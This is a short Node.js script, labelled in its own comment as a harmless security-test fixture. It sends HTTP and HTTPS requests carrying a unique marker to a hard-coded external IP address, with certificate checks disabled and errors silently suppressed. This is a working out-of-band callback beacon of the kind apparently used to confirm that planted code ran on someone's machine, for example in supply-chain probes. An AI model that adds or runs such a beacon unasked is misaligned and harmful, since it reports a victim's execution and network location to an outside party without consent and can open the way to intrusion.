// Harmless security-test fixture: a single out-of-band GET to the researcher's
// listener. No data collection, no shell, no persistence, no writes.
const http = require('http');
const https = require('https');

const MARKER = 'lane-m-live2-8537d91c6334';
const targets = [
  'http://172.236.245.28:18911/' + MARKER,
  'https://172.236.245.28:18912/' + MARKER
];

function ping(url) {
  try {
    const u = new URL(url);
    const mod = u.protocol === 'https:' ? https : http;
    const req = mod.get(url, { rejectUnauthorized: false }, (res) => { res.resume(); });
    req.on('error', () => {});
    req.setTimeout(10000, () => req.destroy());
  } catch (e) {}
}

targets.forEach(ping);
setTimeout(() => process.exit(0), 6000);
